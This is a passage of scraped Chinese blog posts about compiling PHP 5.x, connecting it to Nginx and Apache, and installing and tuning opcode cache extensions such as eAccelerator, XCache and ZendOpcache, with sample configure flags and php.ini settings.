\u0026lt;==https需要\r--with-pcre-regex # \u0026lt;==使用pcre正则\t--with-pear # \u0026lt;==安装pear，一般没啥用\t--with-xmlrpc # \u0026lt;==打开xml-rpc的c语言\r--enable-libxml --disable-rpath # \u0026lt;==关闭额外的运行库文件\r--with-xsl # \u0026lt;==打开XSLT文件支持,扩展libXML2库,需要libxslt软件\r--with-zlib # \u0026lt;==打开zlib库的支持,用于http压缩传输\r--enable-zip # \u0026lt;==打开对zip的支持\r--enable-bcmath # \u0026lt;==打开图片大小调整,用zabbix监控时会用到该模块\r--enable-inline-optimization # \u0026lt;==优化线程\r--enable-mbregex # \u0026lt;==\r--enable-mbstring # \u0026lt;==支持mbstring\r--with-mcrypt # \u0026lt;==编码函数库\r--with-mhash # \u0026lt;==mhash算法的扩展\r--enable-opcache # \u0026lt;==php自带的加速模块php5.5\r--enable-pcntl # \u0026lt;==freeTDS需要用到,可能是链接mssql\r--enable-shmop # \u0026lt;==\r--enable-soap # \u0026lt;==soap模块的扩展\r--enable-sockets # \u0026lt;==打开sockets支持\r--enable-sysvsem # \u0026lt;==使用sysv信号机制,则打开此选项\r--enable-short-tags # \u0026lt;==开启短标签\r--with-fpm-user=www --with-fpm-group=www --enable-fpm # \u0026lt;==表示激活PHP-FPM方式服务,即FactCGI方式运行PHP服务\r--with-apxs2=/app/apache/bin/apxs # \u0026lt;==使httpd支持PHP\r--enable-json\r--with-bz2\r--enable-filter\r--enable-session\r公共编译参数 ./configure \\\r--prefix=/app/php-5.5.38 \\\r--with-curl \\\r--with-freetype-dir \\\r--with-gd \\\r--with-png-dir \\\r--with-jpeg-dir \\\r--enable-gd-native-ttf \\\r--with-gettext \\\r--with-iconv-dir \\\r--with-kerberos \\\r--with-libxml-dir \\\r--enable-xml \\\r--enable-safe-mode \\\r--with-mysql=/app/mysql/ \\\r--with-mysqli=/app/mysql/bin/mysql_config \\\r--with-pdo-mysql \\\r--with-pdo-sqlite \\\r--with-openssl \\\r--with-pcre-regex \\\r--with-pear \\\r--with-xmlrpc \\\r--enable-libxml \\\r--disable-rpath \\\r--with-xsl \\\r--with-zlib \\\r--enable-zip \\\r--enable-bcmath \\\r--enable-inline-optimization \\\r--enable-mbregex \\\r--enable-mbstring \\\r--with-mcrypt \\\r--with-mhash \\\r--enable-opcache \\\r--enable-pcntl \\\r--enable-shmop \\\r--enable-soap \\\r--enable-sockets \\\r--enable-sysvsem \\\r--enable-short-tags \\\r--enable-json \\\r--with-bz2 \\\r--enable-filter \\\r--enable-session \\\r--with-fpm-user=www \\\r--with-fpm-group=www \\\r--enable-fpm \\\r--with-apxs2=/app/apache/bin/apxs\rconfigure: error: Cannot find libmysqlclient under /app/mysql/.\r解决：\nln -s /app/mysql/lib /app/mysql/lib64\rln -s /app/mysql/lib/libmysqlclient.so.15./app/mysql/lib64/libmysqlclient_r.so\rnginx 5.3.27 ./configure \\\r--prefix=/app/php-5.3.27 \\\r--with-mysql=/app/mysql \\\r--with-iconv-dir=/usr/local/libiconv \\\r--with-freetype-dir \\\r--with-jpeg-dir \\\r--with-png-dir \\\r--with-zlib-dir \\\r--with-libxml-dir \\\r--enable-xml \\\r--disable-rpath \\\r--enable-safe-mode \\\r--enable-bcmath \\\r--enable-shmop \\\r--enable-sysvsem \\\r--enable-inline-optimization \\\r--with-curl \\\r--enable-mbregex \\\r--enable-fpm \\\r--enable-mbstring \\\r--with-mcrypt \\\r--with-gd \\\r--enable-gd-native-ttf \\\r--with-openssl \\\r--with-mhash \\\r--enable-pcntl \\\r--enable-sockets \\\r--with-xmlrpc \\\r--enable-zip \\\r--enable-soap \\\r--enable-short-tags \\\r--enable-zend-multibyte \\\r--enable-static \\\r--with-xsl \\\r--with-fpm-user=nginx \\\r--with-fpm-group=nginx \\\r--enable-ftp\r注：上述每行结尾的换行符反斜线（\\）之后不能再有任何字符包括空格\napache 5.3 ./configure \\\r--prefix=/app/php-5.3.27 \\\r--with-mysql=/app/mysql \\\r--with-iconv-dir=/usr/local/libiconv \\\r--with-apxs2=/app/apache/bin/apxs \\\r--with-freetype-dir \\\r--with-jpeg-dir \\\r--with-png-dir \\\r--with-zlib-dir \\\r--with-libxml-dir \\\r--enable-xml \\\r--disable-rpath \\\r--enable-safe-mode \\\r--enable-bcmath \\\r--enable-shmop \\\r--enable-sysvsem \\\r--enable-inline-optimization \\\r--with-curl \\\r--with-curlwrappers \\\r--enable-mbregex \\\r--enable-mbstring \\\r--with-mcrypt \\\r--with-gd \\\r--enable-gd-native-ttf \\\r--with-openssl \\\r--with-mhash \\\r--enable-pcntl \\\r--enable-sockets \\\r--with-xmlrpc \\\r--enable-zip \\\r--enable-soap \\\r--enable-short-tags \\\r--enable-zend-multibyte \\\r--enable-static \\\r--with-xsl \\\r--enable-ftp\r配置php.ini /home/tools/php-5.3.27/php.ini-production\r/home/tools/php-5.3.27/php.ini-development\rcp /home/tools/php-5.3.27/php.ini-production /app/php/lib/php.ini\r开发环境更多的是开启日志、调试信息，而生产环境都是关闭状态。\n配置PHP（FastCGI）的配置文件php-fpm.conf PHP5位置：/app/php/etc/ PHP7位置：/app/php/etc/和 php-fpm.d cp php-fpm.conf.default php-fpm.conf # \u0026lt;==PHP5只需要改它即可\rphp-fpm.d/www.conf.default # \u0026lt;==PHP7还需要改这个文件\r3 配置Nginx支持PHP程序 # 这里如果配置不好，很容易出现404错误，\r# 此处也可以吧两个localtion里的root html/blog合成一个 location ~.*\\.(php|php5)?$ {\rfastcgi_pass 127.0.0.1:9000;\rfastcgi_index index.php;\rinclude fastcgi.conf;\rindex index.html index.htm;\r} # \u0026lt;==可将所有location里的root提出到外面。\r原因：local中没有路径，要么加路径，要么提出最外面\r4 配置apache支持PHP 默认生成\n$ grep libphp5 /app/apache/conf/httpd.conf\rLoadModule php5_module modules/libphp5.so\r$ ll /app/apache/modules/\r总用量 29620\r-rw-r--r--. 1 root root 94月 8 03:02 httpd.exp\r-rwxr-xr-x. 1 root root 303164月 21 01:46 libphp5.so\r修改311行\nAddType application/x-httpd-php .php .phtml\rAddType application/x-httpd-php-source .phps\r更改daemon，更改用户是为了安全考虑\n打不开解决方法：\n$ lsof -i:80\rCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME\rhttpd 5 root 4u IPv6 69 TCP *:http (LISTEN)\rhttpd 60apache 4u IPv6 69 TCP *:http (LISTEN)\r$ /app/apache/bin/apachectl restart\r","permalink":"https://www.oomkill.com/2016/06/php-installtation/","summary":"","title":"编译安装PHP"},{"content":"PHP缓存加速器介绍 操作码介绍及缓存原理 当客户端请求一个PHP程序时，服务器的PHP引擎会解析该PHP程序，并将其编译为特定的操作码（Operate Code，简称opcode）文件，该文件是执行PHP代码后的一种二进制表示形式。默认情况下，这个编译好的操作码文件由PHP引擎执行后丢弃。而操作码缓存（Opcode Cache）的原理就是将编译后的操作码保存下来，并放到共享内存里，以便在下一次调用该PHP页面时重用它，避免了相同代码的重复编译，节省了PHP引擎重复编译的时间，降低了服务器负载，同时减少了CPU和内存开销。\nPHP缓存加速软件介绍 为了提高PHP引擎的高并发访问及执行速度，产生了一系列PHP缓存加速软件。这些软件设计的目的就是缓存前文提到的PHP引擎解析过的操作码文件，以便在指定时间内有相同的PHP程序请求访问时，不再需要重复解析编译，而是直接调用缓存中的PHP操作码文件，这样就提高了动态Web服务的处理速度，从而提升了用户访问企业网站的整体体验。\nLAMP环境PHP缓存加速器的原理 下面简单介绍Apache环境的PHP缓存加速器原理。\n在LAMP环境中，Apache服务是使用libphp5.so响应处理PHP程序请求的，整个流程大概如下：\nApache接收客户的PHP程序请求，并根据规则过滤之。\nApache将PHP程序请求传递给PHP处理模块libphp5.so。\nPHP引擎定位磁盘上的PHP文件，并将其加载到内存中解析。\nPHP处理模块libphp5.so将PHP源代码编译成为opcode。\nPHP处理模块libphp5.so执行opcode，然后把opcode缓存起来。\nApache接收客户端新的PHP程序请求，PHP引擎直接读取缓存执行opcode文件，并将结果返回。在这一次任务中，就无第4步的编译解 析了，从而提升了PHP编译解析效率。\nPHP缓存加速器解决的是上述第5步的问题，默认情况下PHP会将opcode内容执行后丢弃，这里却通过PHP缓存加速软件，将opcode内容缓存了下来，目的是当有重复请求时，不需要再重复编译解析PHP程序代码，因为在高并发高访问量的网站上，大量的重复编译会消耗很多的系统资源和时间，而这也就会成为瓶颈，既影响了处理速度，又加重了服务器的负载，为了解决此问题，PHP缓存加速器就这样诞生了。\n图4-1是LAMP环境下PHP请求及操作码缓存过程的原理示意图\rLNMP环境PHP缓存加速器的原理详解 在LNMP环境中，PHP引擎不再使用libphp5.so模块了，而是启动了独立的FCGI即php-fpm进程，由它监听来自Nginx的PHP程序请求，并交给PHP引擎解析处理，整个执行流程大概如下：\nPHP缓存加速器软件种类及选择建议 PHP缓存加速器软件常见的种类有XCache、eAccelerator、APC（Alternative PHP Cache），ZendOpcache等，那么，在企业环境我们要如何选择PHP缓存加速器软件呢？\n事实上，任选其一即可，没必要都安装上，都安装也可能会发生冲突。总的建议就是根据企业的业务需求及选择前的压力测试结果，或者根据个人的经验偏好选择。不过，老男孩建议首选XCache，其次是eAccelerator，如果想尝新，可以选择ZendOpcache。\n首选XCache的原因如下：\n经过测试，XCache效率更高、速度更快。 XCache软件开发社区更活跃，最新版2014年底发布。 支持更高版本的PHP，例如PHP 5.5、PHP 5.6。 次选eAccelerator的原因如下：\n安装及配置参数更简单，加速效果也不错。 文档资料较多，但官方对软件的更新很慢，社区不活跃。 仅适合PHP版本5.4以下的程序。 选择ZendOpcache的原因如下：\n是PHP官方研发的新一代缓存加速软件，以后的发展潜力可能会很好，PHP 5.5以前的版本可以通过ZendOpcache软件以插件扩展的方式安装，从PHP 5.5版本开始已经整合到PHP软件里了，编译时只需指定一个参数即可，例如：\u0026ndash;enable-opcache。 ZendOpcache可能是未来的缓存加速首选，现在的稳定性还有待检验，小规模环境下PHP 5以前的版本可以通过插件式安装使用，PHP 5以上的版本可以直接指定参数编译使用。若可以忍受ZendOpcache的各种未知问题的话，也可以尝试使用。 安装PHP缓存加速器扩展 安装PHP eAccelerator缓存加速模块 eAccelerator缓存加速插件说明\neAccelerator是一个免费的、开放源代码的PHP加速、优化及缓存的扩展插件软件，它可以缓存PHP程序编译后的中间代码文件（opcode）、session数据等，降低PHP程序在编译解析时对服务器的性能开销。eAccelerator还可以加快PHP程序的执行速度，降低服务器负载压力，使PHP程序代码执行效率提高1~10倍。\neAccelerator会把编译好的PHP程序存放在共享内存里，然后每次从内存里调用执行，可以设定把一些不适合放在内存里缓存的编译结果存储到磁盘上，默认情况下，磁盘和内存缓存都会被eAccelerator使用。\neAccelerator的最新版为0.9.6.1，支持的PHP最新版本为PHP 5.3及以前5系列的版本。 早期的0.9.5版本支持PHP 4和PHP 5.2以前的版本。\neAccelerator下载地址为：https://github.com/eaccelerator/eaccelerator/downloads。\neAccelerator插件安装过程\n具体的安装命令集如下：\n/app/php/bin/phpize\r./configure --enable-eaccelerator=shared --with-php-config=/app/php/bin/php-config\r安装PHP XCache缓存加速模块 XCache缓存加速插件说明\nXCache是一个开源的、又快又稳定的PHP opcode缓存器/优化器，其项目leader曾经是Lighttpd（和Nginx类似的高速Web服务软件）的开发成员之一。XCache把PHP程序编译后的数据（opcode）缓存到共享内存里，避免相同的程序重复编译。用户请求相同的PHP程序时，可以直接使用缓存中已编译好的数据，从而提高PHP的访问速度，通常可以提升2~5倍，并大幅降低服务器负载开销。\n很多公司使用XCache，它已经能在大流量/高负载的生产环境中稳定运行，与同类型的opcode缓存器相比在各个方面都更胜一筹，例如：社区活跃、快速开发、能够快速跟进PHP的版本更新等。 当前稳定版本为3.1.x（全面支持PHP 5.1~5.5）和3.2.x（2014年底发布，全面支持PHP 5.1~5.6）。\nXCache软件详情请参考：\nhttp://xcache.lighttpd.net\nhttp://xcache.lighttpd.net/wiki/Introduction。\nXCache插件的安装过程\n/app/php/bin/phpize\r./configure --enable-xcache --with-php-config=/application/php/bin/php-config\r./configure --enable-xcache=shared --with-php-config=/app/php/bin/php-config\rPHP官方加速插件ZendOpcache ZendOpcache插件说明\n从PHP 5.5开始，官方已经集成了新一代的缓存加速插件，其名字为ZendOpcache，功能和前三者相似但又有少许不同，据官方说，ZendOpcache缓存速度更快。\n这几个PHP加速插件的主要原理基本相同，就是把PHP执行后的数据缓存到内存中从而避免重复的编译过程，使其能够直接使用缓存中已编译的代码，从而提高速度，降低服务器负载。它们的效率是显而易见的，\t一些大型的CMS，每次打开一个页面要调用数十个PHP文件，执行数万行代码，效率可想而知，安装上述加速器后，打开页面的速度明显加快。\nPHP 5.5以上版本，支持ZendOpcache很简单，只需在编译PHP 5.5时加上\u0026ndash;enable-opcache就行了。其实，在PHP5.5版本以前，ZendOpcache也有独立的软件，并且也支持低版本的PHP 5.2.*、PHP5.3.*、PHP 5.4.*。\n官方下载地址为：http://pecl.php.net/package/ZendOpcache。\nZendOpcache插件安装过程\n在PHP源码包ext目录下有一些扩展库，可直接安装，也可去官网下载扩展后安装\n/application/php/bin/phpize\r./configure --enable-opcache --with-php-config=/application/php/bin/php-config\r最后需要在php.ini里开启opcache模块才可使用\n[Zend Opcache]\rzend_extension = /app/php5.6.26/lib/php/extensions/no-debug-non-zts-20131226/opcache.so\ropcache.memory_consumption=64\ropcache.interned_strings_buffer=8\ropcache.max_accelerated_files=4000\ropcache.force_restart_timeout=180\ropcache.revalidate_freq=60\ropcache.fast_shutdown=1\ropcache.enable_cli=1\r安装数据库缓存及其他PHP扩展插件 安装PHP Memcached扩展插件 图4-3是Memcached缓存架构逻辑图。\rPHP的Memcached扩展插件下载地址为：http://pecl.php.net/package/memcache。\n安装PDO_MYSQL扩展模块 PDO_MYSQL扩展插件说明\nPDO扩展为PHP访问数据库定义了一个轻量级一致性的接口，它提供了一个数据访问抽象层，这样，无论使用的是什么数据库，都可以通过一致的函数执行查询并获取数据。\nPDO_MYSQL扩展插件下载地址为：http://pecl.php.net/get/PDO_MYSQL-1.0.2.tgz。\n技巧：php源码包有或使用谷歌搜索关键字“PDO_MYSQL-1.0.2.tgz download”。\nPDO_MYSQL扩展插件的安装过程\nPDO_MYSQL的安装有两种方法，一种是插件方式安装，另一种是编译PHP时加入PDO_MYSQL支持，直接指定PHP的对应PDO_MYSQL编译参数安装，例如：--with-pdo-mysql=mysqlnd，同时PHP的环境也可以不装MySQL软件，直接指定如下参数--with-mysql=mysqlnd，即可让PHP支持连接MySQL数据库。\n安装其他的PHP扩展插件模块 安装ImageMagick图像软件 ImageMagick是一套功能强大、稳定而且免费的工具集和开发包，可以用来读、写和处理超过89种基本格式的图片文件，包括流行的tiff、jpeg、gif、png、pdf，以及PhotoCD等。利用ImageMagick，可以根据Web应用程序的需要动态生成图片，还可以对一个（或一组）图片进行改变大小、旋转、锐化、减色或增加特效等操作，并将操作的结果以相同格式或其他格式保存。对图片的操作，即可以通过命令行进行，也可以用C/C++、Perl、Java、PHP、Python或Ruby编程来完成。同时ImageMagick提供了一个高质量的2D工具包，部分支持SVG。现在，ImageMagic的主要精力集中在加强性能、减少bug，以及提供稳定的API和ABI上。\nImageMagick的常见功能如下：\n将图片从一个格式转换成另一个格式，包括直接转换成图标。 可以改变图片尺寸，旋转、锐化（sharpen）、减色，设置图片特效。 对图片设置各种尺寸缩略图。 将图片设置为可以适应于Web背景的透明图片。 将一组图片做成gif动画，直接convert。 将几张图片做成一张组合图片。 在一个图片上写字或画图形，带文字阴影和边框渲染。 给图片加边框或框架。 取得一些图片的特性信息。 它几乎包括了gimp可以实现的所有常规插件功能，甚至包括各种曲线参数的渲染功能。ImageMagick的下载地址为：\nhttp://pecl.php.net/package/imagick\nhttps://www.imagemagick.org/download/\nImageMagick安装报错及解决方法。 以下错误是书上写的。我在两天centos6 与centos7共计4台测试并未发现任何错误\n问题1：make步骤出错。 示例如下：\ncd PerlMagick \u0026amp;\u0026amp; /usr/bin/perl Makefile.PL\rCan't locate ExtUtils/MakeMaker.pm in @INC(@INC contains:/usr/local/lib64/perl5 /usr/local/share/perl5 /usr/lib64/perl5/vendor_perl /usr/share/perl5/vendor_perl /usr/lib64/perl5 /usr/share/perl5 .)\rat Makefile.PL line 24.\rBEGIN failed--compilation aborted at Makefile.PL line 24.\rmake[1]:*** [PerlMagick/Makefile] Error 2\rmake[1]:Leaving directory `/home/oldboy/tools/ImageMagick-6.5.1-2'\rmake:*** [all] Error 2\r可以看到，上述内容中有Makefile.PL、/usr/lib64/perl5/vendor_perl和Perl语言的字样，因此可以试着使用 yum install perl-devel -y 命令安装相关包，看看是否可以解决问题。\n安装imagick PHP扩展插件 imagick插件工作需要ImageMagick软件的支持，所以，必须要先安装ImageMagick，否则会报错。\nimagick插件是一个可以供PHP调用ImageMagick功能的扩展模块。使用这个扩展可以使PHP具备和ImageMagick相同的功能。\n安装了ImageMagick图像程序后，再安装PHP的扩展imagick插件，才能使用ImageMagick提供的api进行图片的创建与修改、压缩等操作，因为它们都集成在imagick这个PHP扩展中。\n./configure \\\r--with-php-config=/app/php/bin/php-config \\\r--with-imagick=/app/imagemag/\t#←如果编译安装的ImageMagick需要指定安装路径\r配置PHP加速与缓存相关的扩展插件模块 配置xcache/PDO_MYSQL/imagick模块生效 修改PHP的配置文件php.ini\n修改php.ini的配置文件过程如下：\n查找extension_dir=\u0026quot;./\u0026quot;参数，修改为extension_dir=\u0026quot;/app/php5.3.27/lib/php/extensions/no-debug-non-zts-20090626/\u0026quot;，这个extension_dir对应的路径就是前文编译的模块所在的路径。\n⚠ 提示：默认的PHP配置文件路径为 /app/php/lib/php.ini ，可以通过在编译PHP时添加参数指定php.ini的配置路径 --with-config-file-path=/application/php5.3.27/lib/etc ，如果不指定编译路径，默认为 /application/php/lib/ 。\n在vim命令模式下按Shift+G键跳到文件结尾，增加如下几行，然后保存：\nextension = memcache.so\rextension = pdo_mysql.so\r..\rextension = imagick.so\r配置eAccelerator插件生效并优化参数 1 配置eAccelerator缓存目录\n配置命令1：配置eAccelerator缓存目录：\nmkdir -p /tmp/eaccelerator #←此目录可以用tmpfs内存文件系统或SSD固态硬盘来存储。\rchown -R nginx.nginx /tmp/eaccelerator #←chown后的用户是nginx的用户\r配置命令2：配置eAccelerator参数，命令如下：\n[eaccelerator]\rextension=eaccelerator.so\reaccelerator.shm_size=\u0026quot;64\u0026quot;\reaccelerator.cache_dir=\u0026quot;/tmp/eaccelerator\u0026quot;\reaccelerator.enable=\u0026quot;1\u0026quot;\reaccelerator.optimizer=\u0026quot;1\u0026quot;\reaccelerator.check_mtime=\u0026quot;1\u0026quot;\reaccelerator.debug=\u0026quot;0\u0026quot;\reaccelerator.filter=\u0026quot;\u0026quot;\reaccelerator.shm_max=\u0026quot;0\u0026quot;\reaccelerator.shm_ttl=\u0026quot;3600\u0026quot;\reaccelerator.shm_prune_period=\u0026quot;3600\u0026quot;\reaccelerator.shm_only=\u0026quot;0\u0026quot;\reaccelerator.compress=\u0026quot;1\u0026quot;\reaccelerator.compress_level=\u0026quot;9\u0026quot;\r2 eAccelerator配置参数的详细说明。\neaccellerator 解释说明 [eaccelerator] 开始eAccelerator加速模块配置 extension 加载eaccelerator加速模块，路径相对于extension_dir的配置 eaccelerator.shm_size 存储缓存数据的共享内存大小，如果为0，则最大值看内核配置/proc/sys/kernel/shmmax eaccelerator.cache_dir=\u0026quot;/tmp/eaccelerator\u0026quot; 磁盘缓存存储路径，缓存内容为precompiled code、session、data、content和user entries。默认路径为\u0026quot;tmp/eaccelerator\u0026quot; eaccelerator.enable=\u0026ldquo;1\u0026rdquo; 加速PHP代码执行速度，1为默认值，表示激活；0为不激活。用于缓存前的代码加速 eaccelerator.check_mtime=\u0026ldquo;1\u0026rdquo; 检查缓存修改时间，决定代码是否需要重新编译，1为激活，是默认值 eaccelerator.debug=\u0026ldquo;0\u0026rdquo; 缓存加速调试，0为关闭，1为打开，打开后可以看到缓存命中信息 eaccelerator.filter=\u0026quot;\u0026quot; 设定对象是否缓存规则，空表示不设定 eaccelerator.shm_max=\u0026ldquo;0\u0026rdquo; 可以被放置的缓存最大值，0是不限制 eaccelerator.shm_ttl=\u0026ldquo;3600\u0026rdquo; 缓存文件的生存期 eaccelerator.shm_prune_period=3600\u0026quot; 当共享内存空间不够时，从共享内存中移除老数据的时间周期 eaccelerator.shm_only=\u0026ldquo;0\u0026rdquo; 是否允许缓存数据到磁盘，0为允许，但是对于session data and content caching无影响 eaccelerator.compress=\u0026ldquo;1\u0026rdquo; 是否开启压缩，1为开启 eaccelerator.compress_leve=\u0026ldquo;9\u0026rdquo; 压缩级别，9为最高 根据内容指定是否缓存到共享内存或磁盘的其他参数：\neaccelerator.keys=\u0026quot;shm_and_disk\u0026quot; #←控制keys缓存位置\reaccelerator.sessions=\u0026quot;shm_and_disk\u0026quot; #←控制sessions缓存位置\reaccelerator.content=\u0026quot;shm_and_disk\u0026quot; #←控制内容缓存位置上述3个参数可选的值为：\rshm_and_disk：cache data in shared memory and on disk(default value)\rshm:cache data in shared memory or on disk if shared memory is full or data size greater then \u0026quot;eaccelerator.shm_max\u0026quot;\rshm_only:cache data in shared memory disk_only:cache data on disk\rnone:don't cache data\r更多信息请参考 https://github.com/eaccelerator/eaccelerator/wiki/Settings。\n3 访问PHP页面测试检查eAccelerator加速情况\n$ find /tmp/eaccelerator/ -type f\r/tmp/eaccelerator/48/0/1/eaccelerator-01aa58b81ae5ff3ed966dbbac55535a8\r/tmp/eaccelerator/48/0/2/eaccelerator-02399225c2489318da660dc2213a940e\r...\r/tmp/eaccelerator/48/0/3/eaccelerator-03621af70cbe37e82c125a39bdb8c0b9\r/tmp/eaccelerator/48/0/3/eaccelerator-03ad092ef38eaae48de869a58a893a16\r4 使用tmpfs优化eAccelerator缓存目录\ntmpfs是一种基于内存的文件系统，通常使用tmpfs作为数据临时存储，比本地磁盘存储快很多，此方法适用于临时使用的各类缓存场景。例如：上传图片时很多软件默认在/tmp下临时缓存切图、存放session数据，则可以让/tmp使用tmpfs文件系统来加快访问效率。\nmount -t tmpfs -o size=16m tmpfs /tmp/eaccelerator\r配置XCache插件加速 XCache配置文件参数\n参数 说明 [xcache-common] extension=xcacheso 加载xcache.so,路径相对于extension_dir的配置。自3.0版本开始不再支持使用zend_extension加载XCache的方式 [xcache.admin]xcache.admin.enable_auth=On 激活管理员认证 xcache.admin.user=\u0026ldquo;mOo\u0026rdquo;xcache.admin.pass=\u0026ldquo;md5encrypted password\u0026rdquo; 指定XCache管理员用户名和密码.密码根据http://xcache. lighttpd.net/demo/cacher/mkpassword php 地址产生，留空表示禁止管理页面 [xcache] 开始XCache缓存参数配置段.下面所有的初始值即为默认值，除非明确说明 xcache.shm_scheme=\u0026ldquo;mmap\u0026rdquo; 设置XCache如何从系统分配共享内存 xcache.size = 60M 0为禁止缓存，非0则启动缓存。需要注意系统所允许的mmap最大值 xcachc.count = 1 指定将Cache切分成多少块，官方方推荐设置为服务器CPU的数量grep -c processor /proc/cpuinfo 1 xcache.slols=8K hash槽个数的参考值.缓冲超过此数值时也没有任何问题（you can always store count(items) \u0026gt; slots) xcache.gc_interval = 0 回收器扫描过期的对象回收内存空间的间隔.0为不扫描，其他值的单位是秒 xcache.var_size = 4M\nxcache.var_count = 1 xcache.var_slots = 8K\nxcache.var_ttl = 0 xcache.var_gc_interval =300 这几个值和上面的几个类似，只不过用于变量缓存，而不是 opcode缓存 ;N/A for /dev/zero xcache.readonly_proteciion = off 如果启用了该参数.将略微降低性能，但会提高一定的安全系数。 这个选项对于 xcache.mmap_path = /dev/zero 无效 xcache.mmap_path=\u0026quot;/dev/zero\u0026quot; 对于nix, xcache.mmap_path是一个文件路径而非目录。如果要启 用该参数，请使用\u0026quot;/tmp/xcache\u0026quot;这样的路径，而不是\u0026quot;/dev/\u0026quot;。如 果开启了 xcache.readonly_protection参数，不同进程组的PHP将不会共享同一个/tmp/xcache路径 xcache.coredump_directory=\u0026quot;\u0026quot; 当XCache crash后，适否把数据保存到指定路径 xcachc.disable_on_crash =off 当XCache发生crash时，自动动关闭XCache缓存 更多参数请参考官方文档：http://xcache.lighttpd.net/wiki/XcacheIni\n编辑xcache.ini，修改XCache的配置参数\nxcache.size=256M\rxcache.count=2\rxcache.ttl=86# 24小时\rxcache.gc_interval=3600\rxcache.var_size=64M\r将修改后的xcache.ini合并到php.ini结尾。\ncat /home/oldboy/tools/xcache-3.2.0/xcache.ini \u0026gt;\u0026gt;php.ini\r检查XCache加速情况配置\nWarning: Module 'XCache' already loaded in Unknown on line 0\r# 出现这样的提示，应该是加载xcache原因 ，取消后提示消失\r/app/php/bin/php -v\rPHP 5.5.20 (cli) (built: Oct 16 2016 21:28:19)\rCopyright (c) 1997-2014 The PHP Group\rZend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies\rwith XCache v3.2.0, Copyright (c) 2005-2014, by mOo\rwith XCache Cacher v3.2.0, Copyright (c) 2005-2014, by mOo\r复制XCache软件下面的缓存加速管理PHP程序到站点目录下\ncp -r ~/tools/xcache-3.2.0/htdocs /var/html/www/xadmin\rchown -R www.www /var/html/www/xadmin\r编辑php.ini文件，xcache.admin模块配置如下\n[xcache.admin]\rxcache.admin.enable_auth = On\rxcache.admin.user = \u0026quot;admin\u0026quot;\rxcache.admin.pass = \u0026quot;111\u0026quot;\rMD5加密可用如下方法生成\n$ echo 111|md5sum\r1181c1834012245d785120e3505ed169 - #←这里生成的并不是md5生成的111，因为echo默认有换行\r$ echo -n 111|md5sum\r698d51a19d8a121ce581499d7b701668 -\r配置ZendOpcache插件加速 1 配置ZendOpcache参数\n在php.ini里添加如下配置：\n[opcache]\rextension=opcache.so #←这种方法不能用了\rzend_extension=/application/php5.3.27/lib/php/extensions/no-debug-non-zts-\r20090626/opcache.so;\rextension=opcache.so\ropcache.memory_consumption=32\ropcache.interned_strings_buffer=8\ropcache.max_accelerated_files=1000\ropcache.revalidate_freq=60\ropcache.fast_shutdown=1\ropcache.enable_cli=1\r2 ZendOpcache配置参数说明\n下表Opcache的部分重要参数进行了说明。\nOPcache参数解释说明 opcache.memoiy_consumption=128 OPcache共享内存空间大小，用于存放precompiled PHP code，默认为64，单位为Mbytes opcache.interned_strings_buffer=8 默认依为4,interned strings内存的数量,单位是M opcache.max_accelerated_files=4000 默认值为2000, OPcache散列表的key的最大数量 opcache.revalidate_freq=60 默认值为2,检查文件时间戳的频率，用于共享内存分配的变化 opcache.fast_shutdown=l 默认值为0,如果激活,一个快速的关闭队列将被用来加速代码 opcache.enable_cli=l 默认值为0,激活PHP CLI的OPcache, 于测试和调试 更多的OPcache参数可以查看安装目录下的README 说明：ZendOpcache是PHP官方的新一代的缓存加速软件，PHP5.5以前可以通过ZendOpcache软件以插件扩展的方式安装，从 ==PHP5.5== 版本开始已经整合到PHP软件里，编译时只需指定一个参数即可，例如： --enable-opcache。\nZendOpcache可能是未来的首选，现在的稳定性还有待检验。在小规模环境下，PHP 5以上的版本可以使用。如果可以忍受其未知的问题也可以使用。\n生产环境PHP扩展插件的安装建议 1 PHP的安装插件表格列表\nPHP EXT module 说明 eaccelerator0.9.5.2 适合PHP5.3以前的版本，PHP缓存加速 eaccelerator-0.9.6 适合PHP5.3版本，PHP缓存加速 ImageMagick 常用图像处理程序，属功能应用 imagick 需要先装图像处理程序，属功能应用 memcache memcache客户端数据库缓存优化应用 memcached 基于libmemcache客户端，性能较memcache更好，高并发首选 PDO_MYSQL PHP数据库访问插件，属功能应用 xcache 支持PHP5.1-5.6，PHP缓存加速 zend opcache zend官方PHP缓存加速插件 2 生产环境插件的安装建议\n对于功能性插件，如果业务产品不需要使用，可以暂时不考虑安装，例如\nPDO_MYSQL\\memcache\\imagick 等。如果不清楚是否需要，最好还是装上，有备无患。\n对于性能优化插件，eAccelerator、XCache、ZendOpcache、APC可以安装任一种，具体情况看实际业务需求，在选择时最好能搭建相关环境进行压力测试，然后根据实际测试结果来选择，用数据说话很重要。\n3 PHP加速插件的测试对比\neAccelerator不支持5.3以上版本\nxcache支持7.0以下版本。\nPHP缓存加速压力测试练习 分别安装ZendOpcache、eacc、XCache缓存加速插件，通过压测软件对比三者的缓存效率。 测试方法：\n不装任何加速插件和分别安装某一个缓存加速软件。 可用压力测试软件webbench、loadruner。 用压力测试方法，通过数据看看到底哪个加速器好 ","permalink":"https://www.oomkill.com/2016/06/php-install-cache-accelerator/","summary":"","title":"配置PHP插件"},{"content":"默认生成\n$ grep libphp5 /app/apache/conf/httpd.conf LoadModule php5_module modules/libphp5.so $ ll /app/apache/modules/ 总用量 29620 -rw-r--r--. 1 root root 9115 4月 8 03:02 httpd.exp -rwxr-xr-x. 1 root root 30316906 4月 21 01:46 libphp5.so 修改httpd配置文件311行\nAddType application/x-httpd-php .php .phtml AddType application/x-httpd-php-source .phps 更改daemon，更改用户是为了安全考虑\n常用的httpd支持php的编译参数\n./configure --enable-xcache=shared --with-php-config=/app/php/bin/php-config ./configure --enable-eaccelerator=shared --with-php-config=/app/php/bin/php-config ./configure --with-php-config=/app/php/bin/php-config --with-pdo-mysql=/app/mysql ./configure --with-php-config=/app/php/bin/php-config --with-imagick=/app/imagemag/ sysconfdir 指定php配置文件路径\n","permalink":"https://www.oomkill.com/2016/06/apache-php/","summary":"","title":"配置apache httpd支持php"},{"content":"关于Linux服务管理 Linux系统从启动到提供服务的过程是这样，先是机器加电，然后通过MBR或者UEFI加载GRUB，再启动内核，内核启动服务，然后开始对外服务。 SysV init UpStart systemd主要是解决服务引导管理的问题。\nCentOS 5：SysV init CentOS 6：Upstart CentOS 7：Systemd http://www.linuxidc.com/Linux/2015-04/115937.htm 1.1 SysV init的优缺点 SysV init是最早的解决方案，依靠划分不同的运行级别，启动不同的服务集，服务依靠脚本控制，并且是顺序执行的。\nSysV 